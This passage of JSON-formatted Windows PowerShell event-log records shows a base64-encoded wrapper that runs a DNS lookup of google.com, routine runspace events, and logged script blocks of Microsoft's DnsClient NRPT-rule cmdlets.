      "details": "powershell.exe -EncodedCommand CgAkAGMAbwBtAG0AYQBuAGQAVABvAFIAdQBuACAAPQAgAEAAJwAKAFIAZQBzAG8AbAB2AGUALQBEAG4AcwBOAGEAbQBlACAALQBOAGEAbQBlACAAZwBvAG8AZwBsAGUALgBjAG8AbQAgAC0AVAB5AHAAZQAgAEEACgAnAEAACgAkAHQAaQBtAGUAbwB1AHQAUwBlAGMAbwBuAGQAcwAgAD0AIAAyADUACgAkAHIAZQBzAHUAbAB0ACAAPQAgAEAAewAKACAAIAAgACAAUwB0AGQAbwB1AHQAIAA9ACAAIgAiAAoAIAAgACAAIABTAHQAZABlAHIAcgAgAD0AIAAiACIACgAgACAAIAAgAFIAZQB0AHUAcgBuAEMAbwBkAGUAIAA9ACAALQAxAAoAfQAKAHQAcgB5ACAAewAKACAAIAAgACAAJABzAGMAcgBpAHAAdABCAGwAbwBjAGsAIAA9ACAAWwBzAGMAcgBpAHAAdABiAGwAbwBjAGsAXQA6ADoAQwByAGUAYQB0AGUAKAAkAGMAbwBtAG0AYQBuAGQAVABvAFIAdQBuACkACgAgACAAIAAgACQAagBvAGIAIAA9ACAAUwB0AGEAcgB0AC0ASgBvAGIAIAAtAFMAYwByAGkAcAB0AEIAbABvAGMAawAgACQAcwBjAHIAaQBwAHQAQgBsAG8AYwBrAAoAIAAgACAAIABpAGYAIAAoAFcAYQBpAHQALQBKAG8AYgAgAC0ASgBvAGIAIAAkAGoAbwBiACAALQBUAGkAbQBlAG8AdQB0ACAAJAB0AGkAbQBlAG8AdQB0AFMAZQBjAG8AbgBkAHMAKQAgAHsACgAgACAAIAAgACAAIAAgACAAJABvAHUAdABwAHUAdAAgAD0AIABSAGUAYwBlAGkAdgBlAC0ASgBvAGIAIAAtAEoAbwBiACAAJABqAG8AYgAKACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUwB0AGQAbwB1AHQAIAA9ACAAKAAkAG8AdQB0AHAAdQB0ACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAKQAuAFQAcgBpAG0AKAApAAoAIAAgACAAIAAgACAAIAAgAGkAZgAgACgAJABqAG8AYgAuAFMAdABhAHQAZQAgAC0AZQBxACAAJwBGAGEAaQBsAGUAZAAnACkAIAB7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJAByAGUAcwB1AGwAdAAuAFMAdABkAGUAcgByACAAPQAgACQAagBvAGIALgBDAGgAaQBsAGQASgBvAGIAcwBbADAAXQAuAEoAbwBiAFMAdABhAHQAZQBJAG4AZgBvAC4AUgBlAGEAcwBvAG4ALgBNAGUAcwBzAGEAZwBlAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJAByAGUAcwB1AGwAdAAuAFIAZQB0AHUAcgBuAEMAbwBkAGUAIAA9ACAAMQAKACAAIAAgACAAIAAgACAAIAB9ACAAZQBsAHMAZQAgAHsACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUgBlAHQAdQByAG4AQwBvAGQAZQAgAD0AIAAwAAoAIAAgACAAIAAgACAAIAAgAH0ACgAgACAAIAAgAH0AIABlAGwAcwBlACAAewAKACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUwB0AGQAZQByAHIAIAA9ACAAIgBDAG8AbQBtAGEAbgBkACAAdABpAG0AZQBkACAAbwB1AHQAIABvAG4AIAB0AGgAZQAgAHMAZQByAHYAZQByACAAYQBmAHQAZQByACAAJAB0AGkAbQBlAG8AdQB0AFMAZQBjAG8AbgBkAHMAIABzAGUAYwBvAG4AZABzAC4AIgAKACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUgBlAHQAdQByAG4AQwBvAGQAZQAgAD0AIAAxADIANAAKACAAIAAgACAAfQAKAH0AIABjAGEAdABjAGgAIAB7AAoAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUwB0AGQAZQByAHIAIAA9ACAAIgBXAHIAYQBwAHAAZQByACAAUwBjAHIAaQBwAHQAIABFAHIAcgBvAHIAOgAgACQAKAAkAF8ALgBFAHgAYwBlAHAAdABpAG8AbgAuAE0AZQBzAHMAYQBnAGUAKQAiAAoAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUgBlAHQAdQByAG4AQwBvAGQAZQAgAD0AIAAxAAoAfQAgAGYAaQBuAGEAbABsAHkAIAB7AAoAIAAgACAAIABpAGYAIAAoACQAagBvAGIAKQAgAHsACgAgACAAIAAgACAAIAAgACAAUwB0AG8AcAAtAEoAbwBiACAALQBKAG8AYgAgACQAagBvAGIAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUACgAgACAAIAAgACAAIAAgACAAUgBlAG0AbwB2AGUALQBKAG8AYgAgAC0ASgBvAGIAIAAkAGoAbwBiACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABTAGkAbABlAG4AdABsAHkAQwBvAG4AdABpAG4AdQBlACAALQBGAG8AcgBjAGUACgAgACAAIAAgAH0ACgB9AAoAJAByAGUAcwB1AGwAdAAgAHwAIABDAG8AbgB2AGUAcgB0AFQAbwAtAEoAcwBvAG4AIAAtAEMAbwBtAHAAcgBlAHMAcwAKAA=="
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 4103,
      "details": "powershell.exe -EncodedCommand CgAkAGMAbwBtAG0AYQBuAGQAVABvAFIAdQBuACAAPQAgAEAAJwAKAFIAZQBzAG8AbAB2AGUALQBEAG4AcwBOAGEAbQBlACAALQBOAGEAbQBlACAAZwBvAG8AZwBsAGUALgBjAG8AbQAgAC0AVAB5AHAAZQAgAEEACgAnAEAACgAkAHQAaQBtAGUAbwB1AHQAUwBlAGMAbwBuAGQAcwAgAD0AIAAyADUACgAkAHIAZQBzAHUAbAB0ACAAPQAgAEAAewAKACAAIAAgACAAUwB0AGQAbwB1AHQAIAA9ACAAIgAiAAoAIAAgACAAIABTAHQAZABlAHIAcgAgAD0AIAAiACIACgAgACAAIAAgAFIAZQB0AHUAcgBuAEMAbwBkAGUAIAA9ACAALQAxAAoAfQAKAHQAcgB5ACAAewAKACAAIAAgACAAJABzAGMAcgBpAHAAdABCAGwAbwBjAGsAIAA9ACAAWwBzAGMAcgBpAHAAdABiAGwAbwBjAGsAXQA6ADoAQwByAGUAYQB0AGUAKAAkAGMAbwBtAG0AYQBuAGQAVABvAFIAdQBuACkACgAgACAAIAAgACQAagBvAGIAIAA9ACAAUwB0AGEAcgB0AC0ASgBvAGIAIAAtAFMAYwByAGkAcAB0AEIAbABvAGMAawAgACQAcwBjAHIAaQBwAHQAQgBsAG8AYwBrAAoAIAAgACAAIABpAGYAIAAoAFcAYQBpAHQALQBKAG8AYgAgAC0ASgBvAGIAIAAkAGoAbwBiACAALQBUAGkAbQBlAG8AdQB0ACAAJAB0AGkAbQBlAG8AdQB0AFMAZQBjAG8AbgBkAHMAKQAgAHsACgAgACAAIAAgACAAIAAgACAAJABvAHUAdABwAHUAdAAgAD0AIABSAGUAYwBlAGkAdgBlAC0ASgBvAGIAIAAtAEoAbwBiACAAJABqAG8AYgAKACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUwB0AGQAbwB1AHQAIAA9ACAAKAAkAG8AdQB0AHAAdQB0ACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAKQAuAFQAcgBpAG0AKAApAAoAIAAgACAAIAAgACAAIAAgAGkAZgAgACgAJABqAG8AYgAuAFMAdABhAHQAZQAgAC0AZQBxACAAJwBGAGEAaQBsAGUAZAAnACkAIAB7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJAByAGUAcwB1AGwAdAAuAFMAdABkAGUAcgByACAAPQAgACQAagBvAGIALgBDAGgAaQBsAGQASgBvAGIAcwBbADAAXQAuAEoAbwBiAFMAdABhAHQAZQBJAG4AZgBvAC4AUgBlAGEAcwBvAG4ALgBNAGUAcwBzAGEAZwBlAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJAByAGUAcwB1AGwAdAAuAFIAZQB0AHUAcgBuAEMAbwBkAGUAIAA9ACAAMQAKACAAIAAgACAAIAAgACAAIAB9ACAAZQBsAHMAZQAgAHsACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUgBlAHQAdQByAG4AQwBvAGQAZQAgAD0AIAAwAAoAIAAgACAAIAAgACAAIAAgAH0ACgAgACAAIAAgAH0AIABlAGwAcwBlACAAewAKACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUwB0AGQAZQByAHIAIAA9ACAAIgBDAG8AbQBtAGEAbgBkACAAdABpAG0AZQBkACAAbwB1AHQAIABvAG4AIAB0AGgAZQAgAHMAZQByAHYAZQByACAAYQBmAHQAZQByACAAJAB0AGkAbQBlAG8AdQB0AFMAZQBjAG8AbgBkAHMAIABzAGUAYwBvAG4AZABzAC4AIgAKACAAIAAgACAAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUgBlAHQAdQByAG4AQwBvAGQAZQAgAD0AIAAxADIANAAKACAAIAAgACAAfQAKAH0AIABjAGEAdABjAGgAIAB7AAoAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUwB0AGQAZQByAHIAIAA9ACAAIgBXAHIAYQBwAHAAZQByACAAUwBjAHIAaQBwAHQAIABFAHIAcgBvAHIAOgAgACQAKAAkAF8ALgBFAHgAYwBlAHAAdABpAG8AbgAuAE0AZQBzAHMAYQBnAGUAKQAiAAoAIAAgACAAIAAkAHIAZQBzAHUAbAB0AC4AUgBlAHQAdQByAG4AQwBvAGQAZQAgAD0AIAAxAAoAfQAgAGYAaQBuAGEAbABsAHkAIAB7AAoAIAAgACAAIABpAGYAIAAoACQAagBvAGIAKQAgAHsACgAgACAAIAAgACAAIAAgACAAUwB0AG8AcAAtAEoAbwBiACAALQBKAG8AYgAgACQAagBvAGIAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUACgAgACAAIAAgACAAIAAgACAAUgBlAG0AbwB2AGUALQBKAG8AYgAgAC0ASgBvAGIAIAAkAGoAbwBiACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABTAGkAbABlAG4AdABsAHkAQwBvAG4AdABpAG4AdQBlACAALQBGAG8AcgBjAGUACgAgACAAIAAgAH0ACgB9AAoAJAByAGUAcwB1AGwAdAAgAHwAIABDAG8AbgB2AGUAcgB0AFQAbwAtAEoAcwBvAG4AIAAtAEMAbwBtAHAAcgBlAHMAcwAKAA=="
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 8197,
      "details": "Runspace state changed to Closed"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 8197,
      "details": "Runspace state changed to Closing"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 12039,
      "details": "Modifying activity Id and correlating"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 8196,
      "details": "Modifying activity Id and correlating"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 12039,
      "details": "Modifying activity Id and correlating"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 8196,
      "details": "Modifying activity Id and correlating"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 4103,
      "details": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -Version 5.1 -s -NoLogo -NoProfile"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 4103,
      "details": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -Version 5.1 -s -NoLogo -NoProfile"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 4103,
      "details": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -Version 5.1 -s -NoLogo -NoProfile"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 4103,
      "details": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -Version 5.1 -s -NoLogo -NoProfile"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 4103,
      "details": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -Version 5.1 -s -NoLogo -NoProfile"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 4103,
      "details": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -Version 5.1 -s -NoLogo -NoProfile"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 4103,
      "details": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -Version 5.1 -s -NoLogo -NoProfile"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 4104,
      "details": "dParameter]@{Name = 'DnsSecIPsecRequired'; ParameterType = 'System.Nullable`1[[System.Boolean, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DnsSecValidationRequired')) {\r\n          [object]$__cmdletization_value = ${DnsSecValidationRequired}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DnsSecValidationRequired'; ParameterType = 'System.Nullable`1[[System.Boolean, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DnsSecValidationRequired'; ParameterType = 'System.Nullable`1[[System.Boolean, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('GpoName')) {\r\n          [object]$__cmdletization_value = ${GpoName}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'GpoName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'GpoName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('IPsecTrustAuthority')) {\r\n          [object]$__cmdletization_value = ${IPsecTrustAuthority}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'IPsecTrustAuthority'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'IPsecTrustAuthority'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Name')) {\r\n          [object]$__cmdletization_value = ${Name}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Name'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Name'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('NameEncoding')) {\r\n          [object]$__cmdletization_value = ${NameEncoding}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'NameEncoding'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'NameEncoding'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('NameServers')) {\r\n          [object]$__cmdletization_value = ${NameServers}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'NameServers'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'NameServers'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Namespace')) {\r\n          [object]$__cmdletization_value = ${Namespace}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Namespace'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Namespace'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Server')) {\r\n          [object]$__cmdletization_value = ${Server}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Server'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Server'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('DisplayName')) {\r\n          [object]$__cmdletization_value = ${DisplayName}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisplayName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisplayName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('PassThru')) {\r\n          [object]$__cmdletization_value = ${PassThru}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'PassThru'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'PassThru'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CmdletOutput'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'Out'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#DnsClientNrptRule'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }\r\n      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('Set', $__cmdletization_methodParameters, $__cmdletization_returnValue)\r\n      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)\r\n\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    End {\r\n        try\r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper.EndProcessing()\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            throw\r\n        }\r\n    }\r\n\r\n    # .EXTERNALHELP PS_DnsClientNRPTRule_v1.0.0.cdxml-Help.xml\r\n}\r\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function 'Set-DnsClientNrptRule' -Alias '*'"
    },
    {
      "source": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
      "event_id": 4104,
      "details": "etization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'PassThru'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'PassThru'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Server')) {\r\n          [object]$__cmdletization_value = ${Server}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Server'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Server'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n        if ($PSBoundParameters.ContainsKey('Force')) {\r\n          [object]$__cmdletization_value = ${Force}\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Force'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\r\n        } else {\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'Force'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        }\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n        [object]$__cmdletization_defaultValue = $null\r\n        [object]$__cmdletization_defaultValueIsPresent = $false\r\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CmdletOutput'; ParameterType = 'Microsoft.Management.Infrastructure.CimInstance'; Bindings = 'Out'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\r\n        $__cmdletization_methodParameter.ParameterTypeName = 'Microsoft.Management.Infrastructure.CimInstance#DnsClientNrptRule'\r\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\r\n\r\n      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }\r\n      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('Remove', $__cmdletization_methodParameters, $__cmdletization_returnValue)\r\n      $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_methodInvocationInfo)\r\n\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            $__cmdletization_exceptionHasBeenThrown = $true\r\n            throw\r\n        }\r\n    }\r\n        \r\n\r\n    End {\r\n        try\r\n        {\r\n            if (-not $__cmdletization_exceptionHasBeenThrown)\r\n            {\r\n                $__cmdletization_objectModelWrapper.EndProcessing()\r\n            }\r\n        }\r\n        catch\r\n        {\r\n            throw\r\n        }\r\n    }\r\n\r\n    # .EXTERNALHELP PS_DnsClientNRPTRule_v1.0.0.cdxml-Help.xml\r\n}\r\nMicrosoft.PowerShell.Core\\Export-ModuleMember -Function 'Remove-DnsClientNrptRule' -Alias '*'\r\n        \r\n\r\nfunction Set-DnsClientNrptRule\r\n{\r\n    [CmdletBinding(SupportsShouldProcess=$true, ConfirmImpact='Medium', PositionalBinding=$false)]\r\n    \r\n    [OutputType([Microsoft.Management.Infrastructure.CimInstance])][OutputType('Microsoft.Management.Infrastructure.CimInstance#DnsClientNrptRule')]\r\n    param(\r\n    \r\n    [Parameter(ParameterSetName='Set3', ValueFromPipelineByPropertyName=$true)]\r\n    [Alias('DirectAccessEnabled')]\r\n    [ValidateNotNull()]\r\n    [ValidateNotNullOrEmpty()]\r\n    [bool]\r\n    ${DAEnable},\r\n\r\n    [Parameter(ParameterSetName='Set3', ValueFromPipelineByPropertyName=$true)]\r\n    [Alias('DirectAccessQueryIPSSECEncryption')]\r\n    [AllowEmptyString()]\r\n    [AllowNull()]\r\n    [ValidateSet('','None','Low','Medium','High')]\r\n    [string]\r\n    ${DAIPsecEncryptionType},\r\n\r\n    [Parameter(ParameterSetName='Set3', ValueFromPipelineByPropertyName=$true)]\r\n    [Alias('DirectAccessQueryIPsecRequired')]\r\n    [System.Nullable[bool]]\r\n    ${DAIPsecRequired},\r\n\r\n    [Parameter(ParameterSetName='Set3', ValueFromPipelineByPropertyName=$true)]\r\n    [Alias('DirectAccessDNSServers')]\r\n    [string[]]\r\n    ${DANameServers},\r\n\r\n    [Parameter(ParameterSetName='Set3', ValueFromPipelineByPropertyName=$true)]\r\n    [Alias('DirectAccessProxyName')]\r\n    [string]\r\n    ${DAProxyServerName},\r\n\r\n    [Parameter(ParameterSetName='Set3', ValueFromPipelineByPropertyName=$true)]\r\n    [Alias('DirectAccessProxyType')]\r\n    [AllowEmptyString()]\r\n    [AllowNull()]\r\n    [ValidateSet('','NoProxy','UseDefault','UseProxyName')]\r\n    [string]\r\n    ${DAProxyType},\r\n\r\n    [Parameter(ParameterSetName='Set3', ValueFromPipelineByPropertyName=$true)]\r\n    [string]\r\n    ${Comment},\r\n\r\n    [Parameter(ParameterSetName='Set3', ValueFromPipelineByPropertyName=$true)]\r\n    [Alias('DnsSecEnabled')]\r\n    